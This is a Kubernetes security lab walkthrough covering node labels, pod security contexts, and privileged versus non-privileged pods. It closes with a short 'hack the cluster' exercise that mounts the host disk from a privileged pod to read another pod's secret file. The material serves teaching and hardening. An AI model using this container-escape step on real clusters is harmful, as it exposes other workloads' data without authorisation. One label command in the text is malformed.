### Getting started with admision controllers
#### Experiment pod node selector
* list the namespaces in the cluster. Notice that there are 2 namespaces dev and prod 
``` bash
kubectl get ns
```
* List the labels of the cluster nodes
``` bash
kubectl get nodes --show-labels
```
``` bash
NAME      STATUS   ROLES           AGE   VERSION   LABELS
kubeadm   Ready    control-plane   17d   v1.24.2   beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=kubeadm,kubernetes.io/os=linux,node-role.kubernetes.io/control-plane=,node.kubernetes.io/exclude-from-external-load-balancers=
```
* Set a label to the node (worker node)
``` bash
kubectl label nodes kubeadm nodeSelector: env=dev
```
* Create a pod in dev namespace
``` bash
kubectl run pod-1 --image=nginx -n dev
```
------------------
#### Effects of privilaged pods and implement security context 
* Create a pod as prvilaged pod
``` bash
kubectl run p1-busybox --image=busybox -it -- sh
If you don't see a command prompt, try pressing enter.
/ # 
/ # 
/ # ps
PID   USER     TIME  COMMAND
    1 root      0:00 sh
    6 root      0:00 ps
/ # echo "hi" > /tmp/file1.txt
/ # ls -l /tmp/
total 4
-rw-r--r--    1 root     root             3 Mar  5 05:27 file1.txt
```
* Create a directory day2 and navigate into that 
``` bash
mkdir day2; cd day2
```
* Add security context to the pod defnition
``` bash
vi sec_context.yml
```
``` bash
apiVersion: v1
kind: Pod
metadata:
  name: pod-sec-context
spec:
  securityContext:
    runAsUser: 1000
    runAsGroup: 2000
  containers:
  - name: sec-ctx-demo
    image: busybox
    command: [ "sh", "-c", "sleep 1h" ]
```
``` bash
kubectl create -f sec_context.yml
kubectl get pods
```
``` bash
kubectl exec -it pod-sec-context -- sh
~ $ 
~ $ ps
PID   USER     TIME  COMMAND
    1 1000      0:00 sh -c sleep 1h
    7 1000      0:00 sh
   12 1000      0:00 ps
~ $ echo "hi" > /tmp/file1.txt
~ $ ls -l /tmp/
total 4
-rw-r--r--    1 1000     2000             3 Mar  5 05:46 file1.txt
```
* open sec_context.yml file and add the following config
``` bash
--- 
apiVersion: v1
kind: Pod
metadata:
  name: pod-sec-context-vol
spec:
  securityContext:
    runAsUser: 1000
    runAsGroup: 2000
    fsGroup: 3000
  volumes:
  - name: sec-ctx-vol
    emptyDir: {}
  containers:
  - name: sec-ctx-demo
    image: busybox
    command: [ "sh", "-c", "sleep 1h" ]
    volumeMounts:
    - name: sec-ctx-vol
      mountPath: /app/data
```
``` bash
kubectl apply -f sec_context.yml 
```
* login into the pod-sec-context-vol pod and perform the following 
``` bash
kubectl exec -it pod-sec-context-vol -- sh
~ $ 
~ $ echo "hi" > /tmp/file1.txt
~ $ ls -l /tmp/
total 4
-rw-r--r--    1 1000     2000             3 Mar  5 05:54 file1.txt
~ $ cd /app/data/
/app/data $ echo "hi" > file1.txt
/app/data $ ls -l
total 4
-rw-r--r--    1 1000     3000             3 Mar  5 05:56 file1.txt
/app/data $ cat /etc/passwd 
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
bin:x:2:2:bin:/bin:/bin/false
sys:x:3:3:sys:/dev:/bin/false
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
operator:x:37:37:Operator:/var:/bin/false
nobody:x:65534:65534:nobody:/home:/bin/false

app/data $ id
uid=1000 gid=2000 groups=2000,3000
```
``` bash 
exit
```
* Creating privilaged pod
``` bash
vi pod2.yml
```
``` bash
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged
    image: nginx
    securityContext:
      privileged: true

---
apiVersion: v1
kind: Pod
metadata:
  name: non-privileged-pod
spec:
  containers:
  - name: non-privileged
    image: nginx

```
``` bash
kubectl apply -f pod2.yml
```
``` bash
kubectl exec -it non-privileged-pod -- bash
root@non-privileged-pod:/# cd /dev/
```
* Note: You can't access low level devices like disk
* List the capabilities of container
``` bash
apt update -y && apt install libcap2-bin -y 
capsh --print
```
* Perform the same steps in privilaged pod and observe the differences. 
* After finishing the experiment delete all the pods
``` bash
kubectl delete pod --all
```
Note: We should not use this command in a production cluster

#### Hack the cluster using privilaged pod
* Login as sam user
``` bash
su - sam
```
* Create a pod 
``` bash
apiVersion: v1
kind: Pod
metadata:
  name: sensitive-app
  namespace: dev
spec:
  containers:
  - image: nginx
    name: demo-pod

---
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: dev
spec:
  containers:
  - image: nginx
    name: priv-pod
    securityContext:
      privileged: true
```
``` bash
kubectl apply -f pod1.yml
```
``` bash
kubectl get pods -n dev
```
* Store some sensitive data to the pod
``` bash
kubectl exec -it -n dev sensitive-app -- bash
```
``` bash
echo "some sensitve data" > /root/secret.txt
```
``` bash
exit
```
* connect to the privilaged pod
``` bash
kubectl exec -n dev -it privileged-pod -- bash
```
``` bash
mkdir /host-disk
```
``` bash
ls /dev/
```
``` bash
mount /dev/vda3 /host-disk/
cd /host-disk
ls
find . -name secret.txt
```
``` bash
exit
exit
```
